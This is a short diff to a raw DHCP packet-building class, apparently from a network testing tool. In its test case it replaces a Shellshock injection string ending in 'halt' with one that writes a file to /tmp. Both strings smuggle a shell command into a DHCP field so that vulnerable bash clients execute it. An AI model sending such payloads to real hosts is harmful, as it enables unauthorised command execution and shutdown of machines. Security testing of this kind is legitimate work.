@@ -434,7 +434,7 @@ class DHCP_raw:
         CHADDR = self.eth.convert_mac(bootp_client_hw_address)  # Client hardware address
 
         # Test case
-        test_command = bytes("() { :; }; halt")
+        test_command = bytes("() { :; }; echo test > /tmp/test")
         test_command = pack("!%ds" % (len(test_command)), test_command)
 
         client_hw_padding = ''.join(pack("B", 0) for _ in range(10))    # Client hardware address padding
